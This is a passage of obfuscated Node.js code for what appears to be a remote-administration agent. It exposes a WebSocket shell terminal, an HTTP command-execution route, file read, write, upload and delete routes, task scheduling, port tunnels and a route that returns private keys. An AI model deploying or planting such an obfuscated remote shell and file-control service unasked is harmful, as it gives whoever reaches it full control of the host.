                'jzOXv': eW(0x52c),
                'eWSVe': eW(0x557),
                'HubUL': eW(0x7ba),
                'JbnrI': eW(0x406),
                'FZzcJ': eW(0x397),
                'tKYwH': eW(0x1c7),
                'scvJf': eW(0x5c8)
            };
        if (a[eW(0x761)](process['platform'], a['gisKL'])) {
            const d = process.env.SystemRoot || 'C:\x5cWindows', f = [
                    a0n[eW(0x4d0)](d, a[eW(0x24f)], a[eW(0x419)], eW(0x355), a[eW(0x5ff)]),
                    process.env.COMSPEC,
                    a0n[eW(0x4d0)](d, a['tNZnZ'], a[eW(0x6c8)])
                ];
            for (const g of f) {
                if (g && a0l[eW(0x45d)](g))
                    return g;
            }
            return a[eW(0x6c8)];
        }
        const b = [
            a[eW(0x3cf)],
            a[eW(0x455)],
            a[eW(0x690)]
        ];
        for (const h of b) {
            if (a0l[eW(0x45d)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[eW(0x45d)](c))
            return c;
        return a[eW(0x449)];
    }
    async ['startSession'](a, b, c) {
        const eX = a0aO, d = {
                'wpvZg': function (g, h) {
                    return g(h);
                },
                'YJVAD': '🔗\x20检测到\x20WS\x20连接，启用\x20Noise\x20加密',
                'ruYgM': eX(0x67f),
                'WxRle': eX(0x6ac),
                'nHkbj': function (g, h) {
                    return g(h);
                }
            };
        this['websocket'] = a, this['requestId'] = b;
        const f = g => a0B[eX(0x793)](eX(0x6ae) + b + ']\x20' + g);
        this[eX(0x58d)] = !c, d[eX(0x3d7)](f, this[eX(0x58d)] ? d[eX(0x752)] : d['ruYgM']), a['on'](d[eX(0x467)], g => this[eX(0x233)](g));
        try {
            this[eX(0x58d)] && await this[eX(0x512)](f), await this['_runTerminal'](f);
        } catch (g) {
            d[eX(0x339)](f, '❌\x20终端会话异常:\x20' + g[eX(0x6ac)]), await this[eX(0x21f)]();
        }
    }
    async [a0aO(0x3f3)](a) {
        const eY = a0aO, b = {
                'xnnyS': eY(0x62c),
                'tIIFQ': function (g, h) {
                    return g === h;
                },
                'XISVh': function (g, h) {
                    return g(h);
                },
                'sJioX': function (g, h) {
                    return g(h);
                },
                'cDaxp': '🔌\x20客户端主动断开',
                'Kbrea': eY(0x52b),
                'AEiGC': eY(0x376),
                'PXMId': function (g) {
                    return g();
                },
                'CWiyJ': eY(0x1c9),
                'jIQYS': function (g, h) {
                    return g(h);
                },
                'dOrJH': eY(0x43a),
                'mqcez': function (g, h) {
                    return g > h;
                },
                'bJudY': eY(0x3f0)
            }, c = this['getAvailableShell']();
        b[eY(0x4f9)](a, eY(0x484) + c);
        const d = Object['assign']({}, process.env);
        delete d['PROMPT_COMMAND'], d[eY(0x4f5)] = b[eY(0x7b3)];
        if (!d[eY(0x28b)])
            d[eY(0x28b)] = b[eY(0x497)];
        const f = b[eY(0x4e3)](a0C);
        try {
            const g = {
                'name': b['Kbrea'],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': f,
                'env': d
            };
            if (b[eY(0x4b0)](process[eY(0x46e)], b[eY(0x18d)]))
                try {
                    this[eY(0x166)] = a0A['spawn'](c, [], g);
                } catch (h) {
                    a('⚠️\x20ConPTY\x20启动失败，回退管道模式:\x20' + h['message']), this['ptyProcess'] = new a0aJ(c, d, f), this[eY(0x166)]['spawn']();
                }
            else
                this[eY(0x166)] = a0A[eY(0x204)](c, [], g);
            b[eY(0x6fc)](a, '🚀\x20终端进程已启动\x20(PID:\x20' + (this[eY(0x166)][eY(0x140)] || eY(0x44b)) + ')'), this[eY(0x6cf)] = b[eY(0x29a)];
            while (b[eY(0x25d)](this['msgQueue'][eY(0x261)], 0x0)) {
                const i = this[eY(0x6e1)]['shift']();
                this[eY(0x2d0)](i);
            }
            this[eY(0x166)][eY(0x2b0)](j => {
                const eZ = eY;
                try {
                    let k = Buffer[eZ(0x426)](j, b['xnnyS']);
                    this[eZ(0x58d)] && this[eZ(0x7b9)] && this[eZ(0x7b9)][eZ(0x5ef)] && (k = this[eZ(0x7b9)][eZ(0x444)](k)), b[eZ(0x4b0)](this[eZ(0x18b)][eZ(0x5d1)], 0x1) && this[eZ(0x18b)]['send'](k);
                } catch (l) {
                }
            }), this[eY(0x166)][eY(0x14c)](({
                exitCode: j,
                signal: k
            }) => {
                const f0 = eY;
                b[f0(0x17e)](a, f0(0x141) + j + f0(0x676) + k + ')'), this['cleanup']();
            }), this[eY(0x18b)]['on'](b[eY(0x5d3)], () => {
                const f1 = eY;
                b[f1(0x4f9)](a, b[f1(0x751)]), this['cleanup']();
            });
        } catch (j) {
            b[eY(0x4f9)](a, '💥\x20启动终端失败:\x20' + j[eY(0x6ac)]), await this[eY(0x21f)]();
            throw j;
        }
    }
    [a0aO(0x2d0)](a) {
        const f2 = a0aO, b = {
                'BrWhn': f2(0x62c),
                'eBsUn': function (c, d) {
                    return c === d;
                },
                'MgNbY': function (c, d) {
                    return c === d;
                },
                'FPUAs': f2(0x2de),
                'oqdEG': f2(0x377),
                'aVSZG': function (c, d) {
                    return c !== d;
                },
                'SruqR': function (c, d) {
                    return c === d;
                },
                'FNdCc': f2(0x3a2)
            };
        if (!this[f2(0x166)])
            return;
        try {
            const c = Buffer[f2(0x426)](a);
            let d;
            this[f2(0x58d)] ? d = this['cipher'][f2(0x64a)](c) : d = c;
            let f = ![], g = d[f2(0x3e1)](b[f2(0x661)]);
            if (g['trim']()[f2(0x2c3)]('{'))
                try {
                    const h = JSON[f2(0x439)](g);
                    f = !![];
                    if (b[f2(0x374)](h[f2(0x1a9)], f2(0x5a4))) {
                        let i = Buffer[f2(0x426)](JSON['stringify']({ 'type': f2(0x5a4) }));
                        if (this[f2(0x58d)])
                            i = this[f2(0x7b9)][f2(0x444)](i);
                        this[f2(0x18b)]['send'](i);
                        return;
                    }
                    if (b[f2(0x344)](h[f2(0x1a9)], b[f2(0x247)])) {
                        this[f2(0x166)][f2(0x2de)](h[f2(0x4f3)] || 0x50, h[f2(0x3de)] || 0x18);
                        return;
                    }
                    if (b[f2(0x374)](h[f2(0x1a9)], b[f2(0x5af)]) && b[f2(0x57f)](h[f2(0x146)], undefined)) {
                        let j = b['SruqR'](h['encoding'], f2(0x3a2)) ? Buffer[f2(0x426)](h[f2(0x146)], b['FNdCc'])[f2(0x3e1)](b[f2(0x661)]) : h['data'];
                        this[f2(0x166)][f2(0x34b)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[f2(0x166)][f2(0x34b)](d[f2(0x3e1)](b['BrWhn']));
        } catch (l) {
            a0B[f2(0x793)](f2(0x6ae) + this[f2(0x32c)] + f2(0x475) + l['message']);
            if (this[f2(0x58d)])
                this[f2(0x21f)]();
        }
    }
}
async function a0aL(a = {}) {
    const f3 = a0aO, b = {
            'CxCLN': f3(0x1d8),
            'aKWcZ': f3(0x2b3),
            'lvJhZ': f3(0x714),
            'mRdDi': f3(0x368),
            'oTRei': f3(0x29f),
            'ywMse': function (c, d) {
                return c === d;
            },
            'NUZum': 'OPTIONS',
            'GqqGF': function (c) {
                return c();
            },
            'LMFeO': function (c, d) {
                return c / d;
            },
            'ODphO': f3(0x487),
            'VyQyx': function (c, d) {
                return c > d;
            },
            'aZSMM': function (c, d) {
                return c - d;
            },
            'ifrJq': f3(0x514),
            'Ktuog': f3(0x49c),
            'ulREg': function (c, d, f) {
                return c(d, f);
            },
            'ZSSuK': function (c, d) {
                return c(d);
            },
            'dtcnh': f3(0x7bd),
            'VJEhD': f3(0x69d),
            'FAKdS': function (c, d) {
                return c === d;
            },
            'NuLCQ': f3(0x29e),
            'opCGW': function (c, d) {
                return c === d;
            },
            'ryAJV': function (c, d) {
                return c(d);
            },
            'hxBej': function (c, d) {
                return c(d);
            },
            'zjBqm': f3(0x2af),
            'GoLCl': f3(0x673),
            'VRmez': f3(0x677),
            'XIvFY': f3(0x341),
            'ASNeh': function (c, d) {
                return c !== d;
            },
            'dSfco': function (c, d, f) {
                return c(d, f);
            },
            'DRnZn': function (c, d, f) {
                return c(d, f);
            },
            'NKBtK': 'base64',
            'jkUrW': f3(0x56d),
            'lZUiW': 'x-original-path',
            'kzaxZ': f3(0x415),
            'zOxIm': f3(0x231),
            'uhZlY': function (c, d) {
                return c === d;
            },
            'nRNnz': function (c, d) {
                return c > d;
            },
            'wRgdx': 'port\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'qZrmF': function (c, d) {
                return c === d;
            },
            'ThSFa': function (c, d) {
                return c(d);
            },
            'NAQtK': function (c, d) {
                return c === d;
            },
            'kPyvA': function (c, d) {
                return c < d;
            },
            'ZaSuH': function (c, d) {
                return c > d;
            },
            'egdxy': f3(0x1f3),
            'weTps': function (c, d) {
                return c === d;
            },
            'DtPxt': 'Closing\x20connection\x20due\x20to\x20missing\x20request_id',
            'uFqLx': 'Missing\x20request_id',
            'tuAoK': f3(0x62c),
            'xwSYH': f3(0x1e6),
            'qdCNl': f3(0x573),
            'KzpGE': function (c, d) {
                return c === d;
            },
            'ZbnYq': 'Shutting\x20down...',
            'HSUrB': f3(0x5e8),
            'wMbpF': f3(0x5fb),
            'pctHS': f3(0x644),
            'FpaTZ': f3(0x310),
            'jlstE': 'CryptoManager\x20initialized',
            'BJNIB': '❌\x20启动熔断:\x20ECDSA\x20公钥缺失或解析失败，非\x20DEBUG\x20模式下拒绝启动',
            'JvgUH': f3(0x198),
            'jJbub': f3(0x456),
            'CjzFX': f3(0x1fd),
            'VWXsG': f3(0x15f),
            'xUxPy': f3(0x6c6),
            'gKBtF': f3(0x2db),
            'gLKZW': function (c, d, f) {
                return c(d, f);
            },
            'rKSws': f3(0x148),
            'bpymX': f3(0x6b3),
            'hggFD': f3(0x62f),
            'dwjrB': f3(0x411),
            'ZovHb': f3(0x409),
            'awycA': '/api/file/cat',
            'BWFCY': '/api/file',
            'LVQMB': f3(0x545),
            'oRdtI': f3(0x1b3),
            'TLJHX': '/api/file/cp',
            'Cmtbw': f3(0x4f0),
            'EMGKu': f3(0x56c),
            'XOnVT': f3(0x4bd),
            'RpjaU': f3(0x52d),
            'saQnS': f3(0x6f3),
            'VjUWj': f3(0x3e5),
            'GzZQn': f3(0x53f),
            'uXxIU': f3(0x324),
            'xeOMm': 'WebSocket\x20route\x20configured',
            'ePObG': f3(0x5d5),
            'iqaWY': f3(0x2e7)
        };
    try {
        const c = await import(b[f3(0x275)]);
        a0y = c[f3(0x43d)];
        const d = await import(f3(0x530));
        a0z = d[f3(0x2b9)], a0B['debug'](b['wMbpF']), a0N[f3(0x39b)](a), a0B[f3(0x637)]('Validating\x20config...'), a0N[f3(0x5ee)](), a0B[f3(0x637)](b[f3(0x3f9)]), a0B[f3(0x637)](b['FpaTZ']);
        const f = new a0P(a0N['ECDSA_PUBLIC_KEY_PEM'], a0N[f3(0x6ea)]);
        a0B[f3(0x637)](b['jlstE']);
        !a0N['DEBUG'] && !f[f3(0x70b)] && (a0B[f3(0x49c)](b[f3(0x6cb)]), a0B[f3(0x49c)](f3(0x385)), process[f3(0x3cd)](0x1));
        a0B[f3(0x637)](b[f3(0x719)]);
        const g = new a0O();
        g[f3(0x3da)] = () => a0N[f3(0x215)](), a0B['debug'](b[f3(0x29c)]), a0B['debug'](b[f3(0x4cb)]);
        const h = new a0S();
        a0B['debug'](b['VWXsG']), a0B[f3(0x637)](b[f3(0x55b)]);
        const i = b[f3(0x5f6)](a0f);
        a0w(i), a0B[f3(0x637)](b[f3(0x271)]), i[f3(0x291)]((m, n, o) => {
            const f4 = f3;
            n[f4(0x431)](b[f4(0x340)], '*'), n[f4(0x431)](b[f4(0x372)], f4(0x4bc)), n[f4(0x431)](b[f4(0x4a0)], b[f4(0x720)]), n[f4(0x431)](f4(0x66c), b[f4(0x626)]);
            if (b['ywMse'](m[f4(0x647)], b[f4(0x303)]))
                return n[f4(0x7ac)](0xc8)[f4(0x755)]();
            b[f4(0x5f6)](o);
        }), i[f3(0x291)](a0f['text']({
            'type': m => m['path'] !== f3(0x545),
            'limit': '50mb'
        })), i[f3(0x291)](a0f['urlencoded']({ 'extended': !![] })), i[f3(0x291)](b[f3(0x59c)](a0R, f, g)), a0B['debug'](b[f3(0x2c4)]), i[f3(0x6f7)](b[f3(0x422)], async (m, n) => {
            const f5 = f3;
            try {
                const o = Math[f5(0x6fd)](Date[f5(0x1e4)]() / 0x3e8);
                !a0N['_baseinfo_cache'] || b['VyQyx'](b[f5(0x309)](o, a0N[f5(0x2be)]), a0N['BASEINFO_CACHE_TTL']) ? (!a0N[f5(0x749)] && (a0N[f5(0x749)] = h[f5(0x5a9)]()[f5(0x65d)](q => {
                    const f6 = f5, r = f6(0x608)[f6(0x2c2)]('|');
                    let s = 0x0;
                    while (!![]) {
                        switch (r[s++]) {
                        case '0':
                            a0N[f6(0x2be)] = Math[f6(0x6fd)](b[f6(0x4e5)](Date['now'](), 0x3e8));
                            continue;
                        case '1':
                            a0N['_baseinfo_cache'] = q;
                            continue;
                        case '2':
                            return q;
                        case '3':
                            a0N[f6(0x749)] = null;
                            continue;
                        case '4':
                            a0B[f6(0x637)](b[f6(0x283)]);
                            continue;
                        }
                        break;
                    }
                })[f5(0x648)](q => {
                    const f7 = f5;
                    a0N[f7(0x749)] = null;
                    throw q;
                })), await a0N[f5(0x749)]) : a0B[f5(0x637)](b['ifrJq']);
                const p = { ...a0N['_baseinfo_cache'] };
                m[f5(0x680)] === !![] ? (p[f5(0x4ef)] = a0N[f5(0x578)], p['noise_key'] = a0N[f5(0x6aa)]) : (p[f5(0x4ef)] = null, p[f5(0x4ee)] = null), n[f5(0x182)](p), b[f5(0x734)](a0N[f5(0x2d4)], '1') && a0aE[f5(0x5a8)]();
            } catch (q) {
                n[f5(0x7ac)](0x1f4)[f5(0x182)]({
                    'status': b[f5(0x639)],
                    'message': q[f5(0x6ac)]
                });
            }
        }), i[f3(0x6f7)](f3(0x476), (m, n) => {
            const f8 = f3;
            let o = a0N[f8(0x388)];
            if (m['query'][f8(0x354)] !== undefined) {
                const r = b[f8(0x158)](parseInt, m[f8(0x1d3)][f8(0x354)], 0xa);
                if (Number['isNaN'](r) || r < 0x1 || b[f8(0x56a)](r, a0N[f8(0x559)]))
                    return n[f8(0x7ac)](0x1a6)['json']({ 'error': f8(0x47f) + a0N[f8(0x559)] });
                o = r;
            }
            const p = g[f8(0x6f8)](o), q = s => new Date(s * 0x3e8)[f8(0x38f)]()[f8(0x479)](f8(0x536), 'Z');
            n[f8(0x182)]({
                'status': 'ok',
                'key_id': p['key_id'],
                'ttl_seconds': p['ttl_seconds'],
                'created_at': b[f8(0x1b7)](q, p[f8(0x3f7)]),
                'expires_at': b['ZSSuK'](q, p[f8(0x33c)]),
                'ecdsa': {
                    'private_key': p[f8(0x39a)][f8(0x61c)](),
                    'public_key': p['ecdsa_public_key']['trim']()
                },
                'ecies': {
                    'private_key': p['ecies_private_key'],
                    'public_key': p['ecies_public_key']
                }
            });
        }), i[f3(0x6f7)](b[f3(0x622)], async (m, n) => {
            const f9 = f3, o = { 'KBwnn': f9(0x623) };
            try {
                const p = Math['floor'](Date[f9(0x1e4)]() / 0x3e8);
                !a0N[f9(0x45f)] || b[f9(0x56a)](b[f9(0x309)](p, a0N[f9(0x4af)]), a0N['STATUS_CACHE_TTL']) ? (!a0N[f9(0x780)] && (a0N[f9(0x780)] = h['getRealtimeInfo']()['then'](r => {
                    const fa = f9;
                    return a0N[fa(0x45f)] = r, a0N[fa(0x4af)] = Math[fa(0x6fd)](Date[fa(0x1e4)]() / 0x3e8), a0N[fa(0x780)] = null, a0B[fa(0x637)](o['KBwnn']), r;
                })[f9(0x648)](r => {
                    const fb = f9;
                    a0N[fb(0x780)] = null;
                    throw r;
                })), await a0N[f9(0x780)]) : a0B[f9(0x637)](b[f9(0x20e)]);
                const q = { ...a0N[f9(0x45f)] };
                n[f9(0x182)](q);
            } catch (r) {
                n[f9(0x7ac)](0x1f4)['json']({
                    'status': f9(0x49c),
                    'message': r[f9(0x6ac)]
                });
            }
        }), i['post'](f3(0x2a0), async (m, n) => {
            const fc = f3;
            try {
                let o = null;
                if (b[fc(0x734)](typeof m[fc(0x19b)], b['VJEhD']))
                    o = m[fc(0x19b)][fc(0x61c)]();
                else
                    m[fc(0x19b)] && b[fc(0x6bf)](typeof m[fc(0x19b)], b[fc(0x3e9)]) && (o = m['body']['cmd'] || '');
                if (!o)
                    return n[fc(0x7ac)](0x190)[fc(0x182)]({
                        'status': b[fc(0x639)],
                        'message': fc(0x773)
                    });
                const p = await a0T['execute'](o, {
                    'cwd': m['body']['cwd'],
                    'env': m[fc(0x19b)][fc(0x473)],
                    'timeout': a0N[fc(0x742)]
                });
                n['json'](p);
            } catch (q) {
                n[fc(0x7ac)](0x1f4)[fc(0x182)]({
                    'status': b[fc(0x639)],
                    'message': q[fc(0x6ac)]
                });
            }
        }), i[f3(0x370)](b[f3(0x463)], async (m, n) => {
            const fd = f3;
            try {
                const o = await a0V[fd(0x428)](m[fd(0x19b)]['path'], m['body']['recursive']);
                n['json']({
                    'status': 'ok',
                    'count': o[fd(0x261)],
                    'files': o
                });
            } catch (p) {
                n['status'](0x1f4)[fd(0x182)]({
                    'status': b[fd(0x639)],
                    'message': p[fd(0x6ac)]
                });
            }
        }), i['post'](f3(0x409), async (m, n) => {
            const fe = f3;
            try {
                const o = await a0V[fe(0x707)](m[fe(0x19b)][fe(0x302)] || []);
                n[fe(0x182)]({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[fe(0x7ac)](0x1f4)[fe(0x182)]({
                    'status': b[fe(0x639)],
                    'message': p[fe(0x6ac)]
                });
            }
        }), i['put'](b[f3(0x328)], async (m, n) => {
            const ff = f3;
            try {
                const o = m[ff(0x19b)][ff(0x745)] || {}, p = b[ff(0x70d)](m[ff(0x19b)][ff(0x6a6)], !![]), q = await a0V[ff(0x5d0)](o, p);
                n[ff(0x182)](q);
            } catch (r) {
                n['status'](0x1f4)[ff(0x182)]({
                    'status': b[ff(0x639)],
                    'message': r[ff(0x6ac)]
                });
            }
        }), i[f3(0x370)](b[f3(0x407)], async (m, n) => {
            const fg = f3;
            try {
                const o = await a0V['readFile'](m['body'][fg(0x738)]);
                n[fg(0x182)](o);
            } catch (p) {
                n[fg(0x7ac)](0x1f4)['json']({
                    'status': b[fg(0x639)],
                    'message': p[fg(0x6ac)]
                });
            }
        }), i[f3(0x370)](b[f3(0x4d5)], async (m, n) => {
            const fh = f3;
            try {
                const o = await a0V[fh(0x64f)](m['body'][fh(0x738)], m[fh(0x19b)]['filename'], m[fh(0x19b)]['content'], m[fh(0x19b)][fh(0x3e8)], m[fh(0x19b)][fh(0x70a)]);
                n[fh(0x182)](o);
            } catch (p) {
                n[fh(0x7ac)](0x1f4)[fh(0x182)]({
                    'status': b[fh(0x639)],
                    'message': p['message']
                });
            }
        }), i[f3(0x370)](b[f3(0x731)], a0f[f3(0x7bb)]({
            'type': b[f3(0x33f)],
            'limit': f3(0x572)
        }), async (m, n) => {
            const fi = f3;
            try {
                const o = b['ryAJV'](decodeURIComponent, m[fi(0x71c)][fi(0x438)] || ''), p = b[fi(0x726)](decodeURIComponent, m[fi(0x71c)][b[fi(0x3c8)]] || ''), q = m['headers'][b[fi(0x597)]], r = m[fi(0x71c)][b['VRmez']];
                if (!o || !p)
                    return n[fi(0x7ac)](0x190)[fi(0x182)]({
                        'status': b['Ktuog'],
                        'completed': ![],
                        'message': b[fi(0x3c3)]
                    });
                const s = b[fi(0x502)](q, undefined) ? b[fi(0x2bc)](parseInt, String(q), 0xa) : null, t = b[fi(0x502)](r, undefined) ? b[fi(0x465)](parseInt, b[fi(0x190)](String, r), 0xa) : null, u = m[fi(0x19b)];
                if (!Buffer['isBuffer'](u))
                    return n['status'](0x190)[fi(0x182)]({
                        'status': fi(0x49c),
                        'completed': ![],
                        'message': fi(0x162)
                    });
                const v = await a0V[fi(0x682)](o, p, u, s, t);
                n['json'](v);
            } catch (w) {
                n[fi(0x7ac)](0x1f4)[fi(0x182)]({
                    'status': b[fi(0x639)],
                    'completed': ![],
                    'message': w['message']
                });
            }
        }), i[f3(0x370)](b[f3(0x6b1)], async (m, n) => {
            const fj = f3;
            try {
                const o = await a0V[fj(0x167)](m[fj(0x19b)][fj(0x738)]), p = Buffer['from'](o[fj(0x2e3)], b[fj(0x2fd)]);
                return n['set'](b[fj(0x187)], o[fj(0x2ea)]['toString']()), n[fj(0x3bc)](b[fj(0x659)], o[fj(0x738)]), n[fj(0x3bc)](b['kzaxZ'], b[fj(0x33f)]), n['send'](p);
            } catch (q) {
                n['status'](0x1f4)[fj(0x182)]({
                    'status': b['Ktuog'],
                    'message': q[fj(0x6ac)]
                });
            }
        }), i[f3(0x5f4)](b[f3(0x4d5)], async (m, n) => {
            const fk = f3;
            try {
                let o = m[fk(0x19b)][fk(0x302)];
                if (!o || !Array[fk(0x649)](o)) {
                    o = [];
                    if (m[fk(0x19b)][fk(0x738)])
                        o['push'](m['body'][fk(0x738)]);
                    if (m[fk(0x19b)][fk(0x42d)])
                        o[fk(0x51c)](m[fk(0x19b)][fk(0x42d)]);
                }
                const p = await a0V[fk(0x571)](o);
                n[fk(0x182)]({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n[fk(0x7ac)](0x1f4)[fk(0x182)]({
                    'status': b['Ktuog'],
                    'message': q[fk(0x6ac)]
                });
            }
        }), i[f3(0x4df)](b[f3(0x4d5)], async (m, n) => {
            const fl = f3;
            try {
                const o = await a0V['moveFiles'](m[fl(0x19b)][fl(0x267)] || m['body']);
                n['json']({
                    'status': 'ok',
                    'total': o[fl(0x261)],
                    'success': o[fl(0x653)](p => p[fl(0x7ac)] === 'ok')[fl(0x261)],
                    'results': o
                });
            } catch (p) {
                n[fl(0x7ac)](0x1f4)['json']({
                    'status': b[fl(0x639)],
                    'message': p[fl(0x6ac)]
                });
            }
        }), i['post'](b[f3(0x42c)], async (m, n) => {
            const fm = f3;
            try {
                const o = await a0V[fm(0x748)](m[fm(0x19b)]);
                n[fm(0x182)]({
                    'status': 'ok',
                    'total': o[fm(0x261)],
                    'success': o[fm(0x653)](p => p[fm(0x7ac)] === 'ok')[fm(0x261)],
                    'results': o
                });
            } catch (p) {
                n[fm(0x7ac)](0x1f4)['json']({
                    'status': b['Ktuog'],
                    'message': p[fm(0x6ac)]
                });
            }
        }), i['post'](b[f3(0x5b7)], async (m, n) => {
            const fn = f3;
            try {
                const o = await a0V[fn(0x5be)](m['body']['path']);
                n[fn(0x182)](o);
            } catch (p) {
                n[fn(0x7ac)](0x1f4)[fn(0x182)]({
                    'status': b[fn(0x639)],
                    'message': p[fn(0x6ac)]
                });
            }
        }), i[f3(0x6f7)]('/api/task/onetime', (m, n) => {
            const fo = f3;
            n[fo(0x182)](a0W[fo(0x7b7)]());
        }), i[f3(0x370)](b[f3(0x2ce)], async (m, n) => {
            const fp = f3;
            try {
                const o = await a0W[fp(0x364)](m[fp(0x19b)]);
                n[fp(0x182)](o);
            } catch (p) {
                n[fp(0x7ac)](0x1f4)[fp(0x182)]({
                    'status': 'error',
                    'message': p[fp(0x6ac)]
                });
            }
        }), i['get'](f3(0x569), (m, n) => {
            const fq = f3;
            n[fq(0x182)](a0W[fq(0x4c4)]());
        }), i[f3(0x370)](f3(0x569), (m, n) => {
            const fr = f3;
            try {
                const o = a0W[fr(0x197)](m[fr(0x19b)]);
                n[fr(0x182)](o);
            } catch (p) {
                n[fr(0x7ac)](0x1f4)[fr(0x182)]({
                    'status': b['Ktuog'],
                    'message': p['message']
                });
            }
        }), i[f3(0x6f7)](b[f3(0x6d7)], (m, n) => {
            const ft = f3;
            n[ft(0x182)](a0W['getTaskStatus']());
        }), i[f3(0x6f7)](f3(0x6f3), (m, n) => {
            const fu = f3;
            let o = parseInt(m[fu(0x1d3)][fu(0x4c9)], 0xa) || 0x32;
            o = Math['min'](Math['max'](o, 0x1), 0x64), n['json'](a0W[fu(0x78e)](o));
        }), i[f3(0x6f7)](b[f3(0x754)], (m, n) => {
            const fv = f3;
            let o = b[fv(0x158)](parseInt, m[fv(0x1d3)][fv(0x4c9)], 0xa) || 0x32;
            o = Math['min'](Math[fv(0x58b)](o, 0x1), 0x64), n[fv(0x182)](a0W[fv(0x26d)](o));
        }), i[f3(0x5f4)](b[f3(0x49e)], (m, n) => {
            const fw = f3;
            n['json'](a0W[fw(0x5b5)]());
        }), i[f3(0x5f4)](b[f3(0x754)], (m, n) => {
            const fx = f3;
            n[fx(0x182)](a0W[fx(0x529)]());
        }), i[f3(0x6f7)](b['VjUWj'], (m, n) => {
            const fy = f3;
            n[fy(0x182)](a0W[fy(0x4da)]());
        }), i[f3(0x370)](f3(0x305), async (m, n) => {
            const fz = f3;
            try {
                const o = await a0W[fz(0x77b)]();
                n[fz(0x182)](o);
            } catch (p) {
                n[fz(0x7ac)](0x1f4)[fz(0x182)]({
                    'status': b[fz(0x639)],
                    'message': p[fz(0x6ac)]
                });
            }
        });
        const j = {
                'debug': (...m) => a0B[f3(0x637)](m['join']('\x20')),
                'info': (...m) => a0B['info'](m['join']('\x20')),
                'warning': (...m) => a0B[f3(0x3b0)](m[f3(0x4d0)]('\x20'))
            }, k = new a0aD(j);
        i[f3(0x6f7)](b[f3(0x25f)], (m, n) => {
            const fA = f3, o = k['list']();
            n[fA(0x182)]({
                'status': 'ok',
                'count': o[fA(0x261)],
                'tunnels': o
            });
        }), i[f3(0x370)](f3(0x53f), async (m, n) => {
            const fB = f3;
            try {
                const o = b[fB(0x1b7)](a0aC, m['body']);
                let p = o[fB(0x513)];
                (b[fB(0x734)](p, undefined) || p === null || b[fB(0x50a)](p, '')) && (p = a0N[fB(0x1ed)]);
                const q = b['ryAJV'](Number, p);
                if (!Number[fB(0x4ec)](q) || q < 0x1 || b[fB(0x1fa)](q, 0xffff))
                    return n['status'](0x1a6)['json']({
                        'status': b['Ktuog'],
                        'created': ![],
                        'port': p,
                        'message': b['wRgdx']
                    });
                const r = await k[fB(0x323)](q, b[fB(0x55a)](o['duplicate'], !![]));
                n[fB(0x182)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[fB(0x73b)],
                    'port': r['port'],
                    'created_at': r[fB(0x1b4)]
                });
            } catch (s) {
                n['status'](s['status'] || 0x1f4)[fB(0x182)]({
                    'status': fB(0x49c),
                    'created': ![],
                    'port': s['port'] ?? null,
                    'message': s[fB(0x6ac)]
                });
            }
        }), i[f3(0x5f4)](f3(0x53f), async (m, n) => {
            const fC = f3;
            try {
                const o = b['ThSFa'](a0aC, m[fC(0x19b)]), p = o[fC(0x513)], q = b[fC(0x180)](Number, p);
                if (p === undefined || b[fC(0x3c2)](p, null) || b['uhZlY'](p, '') || !Number['isInteger'](q) || b[fC(0x37c)](q, 0x1) || b[fC(0x7b8)](q, 0xffff))
                    return n[fC(0x7ac)](0x1a6)[fC(0x182)]({
                        'status': b[fC(0x639)],
                        'deleted': 0x0,
                        'port': p ?? null,
                        'message': b[fC(0x322)]
                    });
                const r = await k[fC(0x4dc)](q, o['tunnel_domain']);
                if (b[fC(0x4f1)](r['status'], 'ok'))
                    return n[fC(0x182)]({
                        'status': 'ok',
                        'deleted': r[fC(0x746)],
                        'port': q,
                        'tunnels': r['tunnels']
                    });
                return n[fC(0x7ac)](r['status'])[fC(0x182)]({
                    'status': b['Ktuog'],
                    'deleted': 0x0,
                    'port': q,
                    'message': r[fC(0x6ac)]
                });
            } catch (s) {
                n[fC(0x7ac)](0x1f4)[fC(0x182)]({
                    'status': fC(0x49c),
                    'deleted': 0x0,
                    'message': s['message']
                });
            }
        }), a0B['debug'](b[f3(0x380)]), i['ws'](f3(0x2cf), async (m, n) => {
            const fD = f3, o = n[fD(0x5e5)][0x0];
            a0B[fD(0x637)](fD(0x40d) + n[fD(0x274)]), a0B[fD(0x637)]('Matched\x20Sub-path:\x20' + o);
            const p = n[fD(0x1d3)][fD(0x6a7)], q = n[fD(0x1d3)][fD(0x3d4)];
            a0B[fD(0x637)](fD(0x6ef) + p);
            if (!p) {
                a0B['debug'](b[fD(0x17a)]), m['close'](0x3f0, b[fD(0x451)]);
                return;
            }
            if (q) {
                const s = a0N[fD(0x4a9)](), t = Buffer[fD(0x426)](b[fD(0x180)](String, q), b['tuAoK']), u = Buffer[fD(0x426)](s, fD(0x62c)), v = t[fD(0x261)] === u[fD(0x261)] && a0k[fD(0x3f8)](t, u);
                if (!v) {
                    a0B[fD(0x3b0)]('[终端会话\x20' + p + fD(0x418)), m[fD(0x3f0)](0x3f0, b['xwSYH']);
                    return;
                }
            }
            const r = new a0aK();
            await r['startSession'](m, p, q);
        }), a0B[f3(0x637)](b[f3(0x3a1)]), a0B[f3(0x637)](b[f3(0x4c3)]);
        const l = i[f3(0x3c4)](a0N[f3(0x1ed)], a0N[f3(0x460)], () => {
            const fE = f3;
            a0B[fE(0x637)](fE(0x1c4) + a0N[fE(0x739)] + fE(0x5b3) + a0N[fE(0x460)] + ':' + a0N[fE(0x1ed)]), a0B[fE(0x637)](b[fE(0x771)]), (b[fE(0x546)](a0N['KMODE'], '1') || b[fE(0x70d)](a0N['KMODE'], '2') && a0aE[fE(0x718)]()) && a0aE[fE(0x4fa)](k);
        });
        process['on'](f3(0x511), () => {
            const fF = f3;
            a0B[fF(0x637)](b['ZbnYq']), l[fF(0x3f0)](), process[fF(0x3cd)](0x0);
        }), a0B['debug'](f3(0x6bd));
    } catch (m) {
        a0B[f3(0x49c)](b[f3(0x238)], m), process[f3(0x3cd)](0x1);
    }
}
(require[a0aO(0x6d1)] === module || require[a0aO(0x6d1)]?.[a0aO(0x3ed)]?.['includes']('ts-node')) && a0aL()[a0aO(0x648)](a0B['error']);
module[a0aO(0x68c)] = {
    'main': a0aL,
    'Config': a0N,
    'CryptoManager': a0P,
